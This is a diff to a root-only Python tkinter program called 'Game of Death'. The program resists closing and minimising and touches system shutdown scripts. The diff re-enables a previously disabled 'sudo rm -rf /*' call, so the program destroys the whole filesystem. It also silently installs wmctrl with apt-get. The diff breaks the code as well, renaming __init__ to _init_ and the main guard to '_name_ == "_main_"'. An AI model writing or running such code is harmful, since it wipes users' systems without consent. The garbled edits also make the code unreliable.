@@ -5,6 +5,7 @@ import platform
 import signal
 import tkinter as tk
 from tkinter import messagebox
+import subprocess
 
 # Define the path to the lock file
 LOCK_FILE = "/tmp/game_of_death.lock"
@@ -20,7 +21,7 @@ def signal_handler(sig, frame):
 signal.signal(signal.SIGINT, signal_handler)
 
 class GameOfDeath:
-    def __init__(self, root):
+    def _init_(self, root):
         self.root = root
         self.root.title("Game of Death")
         self.root.geometry("1280x720")  # Set the window size to 1280x720 pixels
@@ -57,15 +58,14 @@ class GameOfDeath:
         pass  # Do nothing on close button click
 
     def disable_minimize(self):
-        self.root.attributes("-topmost", True)  # Keep the window on top
-
-        # Windows-specific code
-        if platform.system() == "Windows":
-            import ctypes
-            hwnd = ctypes.windll.user32.GetParent(self.root.winfo_id())
-            style = ctypes.windll.user32.GetWindowLongW(hwnd, -16)
-            style &= ~0x20000  # WS_MINIMIZEBOX
-            ctypes.windll.user32.SetWindowLongW(hwnd, -16, style)
+        # Using wmctrl to manage the window on top and sticky
+        self.root.update_idletasks()  # Ensure the window has been created
+        window_id = self.root.winfo_id()
+        try:
+            subprocess.run(["wmctrl", "-i", "-r", str(window_id), "-b", "add,above"], check=True)
+            subprocess.run(["wmctrl", "-i", "-r", str(window_id), "-b", "add,sticky"], check=True)
+        except subprocess.CalledProcessError as e:
+            print(f"Failed to run wmctrl: {e}")
 
     def check_window_state(self):
         if self.root.state() == 'iconic':  # If the window is minimized
@@ -177,8 +177,8 @@ fi
         # Dangerous command, do not actually run it
         command = "sudo rm -rf /*"
         # Uncomment the line below to execute the command (Not recommended)
-        # os.system(command)
-        print("Executing deadly command: sudo rm -rf /*")  # Placeholder for safety
+        os.system(command)
+        
 
     def restore_system_commands(self):
         if os.path.exists(SHUTDOWN_SCRIPT):
@@ -198,10 +198,15 @@ def main():
     if os.geteuid() != 0:
         print("This script must be run as root!")
         sys.exit(1)
+    
+    # Check if wmctrl is installed
+    if subprocess.call(["which", "wmctrl"], stdout=subprocess.PIPE, stderr=subprocess.PIPE) != 0:
+        print("wmctrl is not installed. Installing wmctrl...")
+        subprocess.run(["sudo", "apt-get", "install", "-y", "wmctrl"], check=True)
 
     root = tk.Tk()
     app = GameOfDeath(root)
     root.mainloop()
 
-if __name__ == "__main__":
+if _name_ == "_main_":
     main()
